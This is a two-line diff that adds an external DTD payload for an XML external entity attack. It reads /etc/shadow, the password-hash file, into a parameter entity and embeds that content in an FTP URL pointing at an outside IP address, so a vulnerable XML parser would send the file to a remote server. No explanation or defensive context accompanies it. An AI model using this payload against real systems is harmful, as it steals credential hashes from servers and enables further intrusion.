@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "file:///etc/shadow">
+<!ENTITY % two "<!ENTITY four SYSTEM 'ftp://54.175.159.116/%three;'>">
